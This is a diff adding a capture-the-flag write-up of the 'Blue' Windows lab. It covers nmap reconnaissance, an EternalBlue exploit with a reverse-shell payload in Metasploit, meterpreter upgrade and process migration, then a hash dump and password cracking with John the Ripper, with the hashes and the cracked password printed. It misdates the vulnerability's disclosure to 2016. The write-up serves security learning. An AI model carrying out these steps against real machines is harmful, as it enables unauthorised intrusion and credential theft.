@@ -1,0 +1,315 @@
+= Blue
+
+Author:: 0x42697262
+Category:: Windows
+Difficulty:: Easy
+Play Date:: 2024/03/26 - 2024/03/26
+
+== Information
+
+**Deploy & hack into a Windows machine, leveraging common misconfigurations issues.**
+
+This machine is vulnerable to https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption] exploit.
+Disclosed on March 14, 2016.
+
+EternalBlue exploits a flaw in SMBv1 (and partially SMBv2) where specially crafted packets can trigger remote code execution without authentication.
+Once exploited, it allows an attacker to run arbitrary code on the victim machine, essentially gaining full control.
+
+This was used by WannaCry and NotPeya.
+
+This box is quite nice for teaching the basics of pwning.
+Hopefully, this writeup is enough to teach anyone.
+
+== Task 1) Recon
+
+First, I want to get information about the machine.
+Mostly, everyone uses xref:知識:ROOT:nmap.adoc[nmap] to scan the machine for online hosts, open ports, and discover services.
+
+The full scan command is:
+
+----
+# nmap -sS -sV -O -T5 --script=vuln --traceroute 10.10.5.211 -oN blue.nmap
+----
+
+Oh, **nmap** requires root privileges.
+
+The explanation of each argument is listed below:
+
+* ``-sS``: Performs a **SYN (stealth) scan** to check for open ports without completing full TCP handshakes.
+* ``-sV``: Attempts to **detect service versions** on open ports to identify specific software.
+* ``-O``: Enables **OS detection** to guess the target’s operating system based on responses.
+* ``-T5``: Uses **maximum speed (insane timing)** for faster scanning but with higher chance of detection.
+* ``--script=vuln``: Runs **vulnerability detection scripts** to check for known issues (e.g. MS17-010).
+* ``--traceroute``: Traces the **network path (hops)** to the target to map network routes.
+* ``10.10.5.211``: Specifies the **target IP address** to scan.
+* ``-oN blue.nmap``: Saves the **output in normal format** to a file named `blue.nmap`.
+
+As for the reason why I used ``-T5``, that's because I did not care about the machine.
+If it were to be in a real life situation, I probably want the timing to be the lowest value to avoid getting detected.
+
+.nmap -sS -sV -O -T5 --script=vuln --traceroute 10.10.5.211 -oN blue.nmap
+----
+$ nmap -sS -sV -O -T5 --script=vuln --traceroute 10.10.5.211 -oN blue.nmap
+Nmap scan report for 10.10.5.211 (10.10.5.211)
+Host is up (0.31s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49160/tcp open  msrpc         Microsoft Windows RPC
+Device type: general purpose|media device
+Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|8.1|2012|Embedded Compact 7|10 (99%), Microsoft embedded (94%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_embedded_compact_7 cpe:/o:microsoft:windows_10 cpe:/h:microsoft:xbox_one
+Aggressive OS guesses: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (99%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (97%), Microsoft Windows Server 2012 or 2012 R2 (96%), Microsoft Windows Server 2008 R2 SP1 or Windows 7 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 Professional SP1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP2, Windows 7, or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008, or Windows Embedded Compact 7 (96%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 5 hops
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   108.63 ms 10.17.0.1 (10.17.0.1)
+2   ... 4
+5   406.66 ms 10.10.5.211 (10.10.5.211)
+----
+
+In the nmap report, there are **3** ports **open** that is under 1000.
+
+The machine is also highly vulnerable.
+
+----
+A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
+----
+
+**ms17-010** is a vulnerability known as **EternalBlue**.
+Some quick search online is enough to give me brief description of it.
+
+== Task 2) Gain Access
+
+Now that I know the type of vulnerability the machine has, I can fire up **metasploitable**.
+
+To be honest, I don't really like the method of just using existing tools then exploit a system only to call it "hacking".
+But for the sake of learning the basics, I'll be doing exactly that.
+Researching about EternalBlue is still outside my skill level.
+
+First, start metasploit.
+
+.Running msfconsole
+image::blue/1-msfconsole.png[]
+
+Then I searched for the exploit in metasploit.
+
+.Searching for ms17-010
+image::blue/2-search.png[]
+
+There are a total of 29 modules to choose from.
+I chose the most basic one, module **#0**.
+
+.Using exploit/windows/smb/ms17_010_eternalblue
+image::blue/3-use.png[]
+
+Before I can start running the exploit, I need to set some options first.
+This can be done by running ``show options``.
+
+.Showing options
+image::blue/4-show.png[]
+
+Notice that there are 4 required options.
+3 of those has already been configured by default, but **RHOSTS** is missing.
+
+This is our target host, the remote machine's IP address.
+My remote machine's IP address is **10.10.5.211**.
+
+So, I set the value of **RHOSTS** to **10.10.5.211**.
+
+.Set RHOSTS
+image::blue/5-rhosts.png[]
+
+Wait, before I start executing the exploit, I need to double check the **LHOST** (local host, my attacker machine, me, whoami, bird, whatever) otherwise the exploit would not work.
+This is something I had to figure out why my exploit didn't work before.
+
+Currently, the value of **LHOST** is not configured properly.
+Since I am using OpenVPN, I need to set the IP address accordingly.
+
+Wait!
+One last more.
+
+Before executing, the current payload of meterpreter is set to ``windows/x64/meterpreter/reverse_tcp`` by default.
+I need to set it manually as practice.
+
+.Set payload
+image::blue/6-payload.png[]
+
+Finally, I can run the exploit!
+
+
+.Exploit failed
+image::blue/7-exploit_fail.png[]
+
+Errrr..... The exploit has failed... Anyways, not a problem.
+
+Based on the log, **port 4444** is already in use.
+Most likely because I had previous metasploit shell running and didn't terminate it properly.
+I just need to set the **LPORT** to something else then rerun the exploit.
+
+.Exploit Success!
+image::blue/8-exploit_success.png[]
+
+And by gambling, the exploit should be a success!
+
+== Task 3) Escalate
+
+Currently, my shell has no system privilege.
+That can be upgraded by going back to meterpreter by hitting ``^Z`` and run the ``shell_to_meterpreter`` module.
+
+.Upgrading privileges
+image::blue/9-upgrade.png[]
+
+This is how to run the ``shell_to_meterpreter`` module.
+
+.Using shell_to_meterpreter module and changing session
+image::blue/10-modules.png[]
+
+After this,I need to change the **SESSION** option.
+
+A list of sessions can be viewed by running ``sessions list``.
+
+.Showing sessions lists
+image::blue/11-list.png[]
+
+Set the session to **1** and exploit.
+
+.Set session
+image::blue/12-session.png[]
+
+Finally, use the newly created session.
+
+.Use session 2
+image::blue/13-use.png[]
+
+Now, I need to upgrade my shell to **NT AUTHORITY\SYSTEM** since that has higher privileges.
+Even though my current shell is already **NT AUTHORITY\SYSTEM**.
+
+.Show processes to migrate
+image::blue/14-ps.png[]
+
+Migrating to a process is a gamble.
+Sometimes it works.
+Sometimes it fails.
+
+I just need to find some process that the shell can migrate to.
+
+.Migration
+image::blue/15-migrate.png[]
+
+Luckily, it only took me 2 tries.
+Well, I have an inkling on what kind of process to touch or not but I can't really put evidence to it yet.
+
+== Task 4) Cracking
+
+Here's the most tedious part, cracking hashes!
+Especially if it's in the real world since no dictionary can ever grab your password if it's unique.
+
+But this is a practice lobby so dictionaries is the key.
+
+Simply run ``hashdump`` and get the hashes.
+
+.hashdump
+image::blue/16-hashdump.png[]
+
+After that, save it to a file and bruteforce the hashes.
+
+.Using John The Ripper to bruteforce
+image::blue/17-john.png[]
+
+Finally got the password of the user: ``alqfna22``.
+
+== Task 5) Find flags!
+
+I am a lazy person.
+I do not like manually finding the flags on directories I am not familiar with.
+
+Luckily, MS-DOS has regex search.
+And I already know the flag's filename format: **flag*.txt**
+
+.regex search
+----
+dir C:\ /s /b | findstr "flag.*\.txt"   
+----
+
+Make sure to run ``shell`` in meterpreter shell first.
+After that, execute the search!
+
+.Using REGEX search for the flag.
+image::blue/18-regex.png[]
+
+I found 3 files that's named ``flag1.txt``, ``flag2.txt``, and ``flag3.txt``.
+
+To print each flags, simply run ``type <filename>`` and that's it.
+
+== Conclusion
+
+This challenge is very simple, it was very fun to be able to learn new things.
+This writeup intends as my note for the future.
+
+Some parts were skipped or glossed over, and some doesn't even have proper explanation why such tool is used instead of another one.
+Let's just say it's for the sake of experiencing new and learning something new.
+
+== TL;DR
+
+.Meterpreter commands
+----
+exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/shell/reverse_tcp
+post/multi/manage/shell_to_meterpreter
+----
+
+----
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+----
+
+.Bruteforce hashes
+----
+$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22         (aad3b435b51404eeaad3b435b51404ee)
+1g 0:00:00:06 DONE (2024-11-04 11:19) 0.1577g/s 1608Kp/s 1608Kc/s 1608KC/s alr1979..alpus
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+----
+
+.Search flags
+----
+dir C:\ /s /b | findstr "flag.*\.txt"   
+----
